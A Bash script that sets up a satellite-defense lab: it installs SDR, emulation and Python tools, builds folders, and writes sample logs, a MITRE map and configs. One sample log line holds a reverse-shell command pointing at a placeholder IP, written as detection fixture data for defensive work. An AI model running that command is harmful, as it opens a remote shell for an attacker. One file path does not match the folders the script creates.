#!/bin/bash
#  Lab Setup Script for Satellite Defense Toolkit

set -euo pipefail
echo -e "\n[+] Starting Satellite Defense Toolkit Lab Setup..."

# --- SYSTEM PREP ---
echo "[+] Updating and installing base packages..."
sudo apt update && sudo apt install -y \
    git python3 python3-pip python3-venv \
    docker.io qemu-system-arm qemu-efi qemu-utils \
    rtl-sdr hackrf soapysdr-tools \
    net-tools iptables curl unzip build-essential \
    libusb-1.0-0-dev libfftw3-dev

# --- DOCKER ---
echo "[+] Ensuring Docker is active..."
sudo systemctl enable docker
sudo systemctl start docker

# --- PYTHON ENV ---
echo "[+] Creating Python virtual environment..."
python3 -m venv .venv
source .venv/bin/activate

echo "[+] Installing Python dependencies..."
pip install --upgrade pip
pip install \
    flask flask-socketio websocket-client websockets \
    transformers torch torchaudio openai \
    psutil rich pyyaml opencv-python Pillow numpy \
    vosk pyttsx3 stix2 taxii2-client yara-python \
    geopy scapy matplotlib plotly pyshark

# --- FOLDER STRUCTURE ---
echo "[+] Creating lab directory structure..."
mkdir -p \
  logs/dashboard \
  logs/ota_streams \
  results \
  sandbox \
  pcaps \
  observables \
  threat_feeds \
  webgui_web \
  config \
  data \
  firmware \
  webgui_web/assets

# --- SAMPLE FILES ---
echo "[+] Creating memory and OTA samples..."
dd if=/dev/urandom of=/tmp/mem.bin bs=1M count=1
dd if=/dev/urandom of=logs/ota_streams/ota_stream.bin bs=4K count=10

echo "[+] Creating sample log and MITRE map..."
echo "Suspicious shell execution: bash -i >& /dev/tcp/1.2.3.4/443 0>&1" > logs/sample.log
cat <<EOF > results/mitre_map.json
{
  "Execution": {
    "Command-Line Interface": "$(date -Iseconds)"
  },
  "Persistence": {
    "Startup Folder": "$(date -Iseconds)"
  }
}
EOF
echo '["command-line interface", "startup folder"]' > observables/observed_tactics.json

# --- CONFIG FILES ---
echo "[+] Generating default Copilot config..."
cat <<EOF > config/copilot_config.json
{
  "ai_model": "gpt-4",
  "voice_alerts": false,
  "max_tokens": 2048,
  "temperature": 0.3
}
EOF

echo "[+] Creating dashboard default agent entry..."
cat <<EOF > webgui/agents.json
[
  {
    "id": "satlab001",
    "type": "ground_station",
    "location": "Lab",
    "status": "active"
  }
]
EOF

# --- TOOL CHECK ---
echo "[+] Verifying key tools..."
which rtl_power || echo "WARNING: rtl_power not found"
which qemu-system-arm || echo "WARNING: qemu-system-arm not found"

# --- README LOG ---
echo "[✓] Satellite Defense Toolkit Lab setup completed successfully."
echo "[✓] You may now run: source .venv/bin/activate && python3 webgui_web/app.py"
